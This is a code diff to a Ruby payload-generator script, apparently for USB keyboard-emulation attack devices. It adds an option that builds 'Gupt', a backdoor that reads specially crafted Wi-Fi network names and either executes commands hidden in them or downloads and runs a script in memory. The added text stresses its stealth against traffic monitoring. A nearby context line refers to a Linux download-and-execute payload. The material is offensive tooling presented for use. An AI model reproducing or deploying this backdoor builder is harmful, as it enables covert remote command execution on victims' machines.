@@ -505,6 +505,25 @@ def enable_psremoting
   search_replace("./lib/src/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
 end
 
+def gupt
+  puts"\nThis backdoor could execute commands and scripts from specially crafted Wireless Network Names..".bold
+  puts"\nGupt looks for a specially crafted Wireless Network Name/SSID from list of all avaliable networks."
+  puts"\nIt matches first four characters of each SSID with the parameter MagicString."
+  puts"\nOn a match, if the 5th character is a 'c', rest of the SSID name is considered to be a command and executed."
+  puts"\nIf the 5th character is a 'u', rest of the SSID is considered the id part of Google URL Shortener and a script is downloaded and executed in memory."
+  puts"\nGupt does not connect to any Wireless network and this makes it more stealthy and helps in bypassing network traffic monitoring."
+  puts"\nSee this post for more details on using Gupt: http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html"
+
+  magicstring = input("Enter the magictring (strictly 4 characters) which Gupt compares with the availabble SSIDs: ")
+  arguments = input("Enter the arguments/function name, if any, to be passed to the downloaded script: ")
+  if (arguments == "")
+    arguments = "null"
+  end
+  search_replace("./lib/src/gupt.ino","#$output_path/output/gupt.ino",magicstring, arguments)
+end
+
+
+
 def linux_download_execute
   puts"\nThis payload downloads an elf in text format, changes it back to elf using xxd and executes it.".bold
   puts"You must manually convert and upload an elf to text.".bold
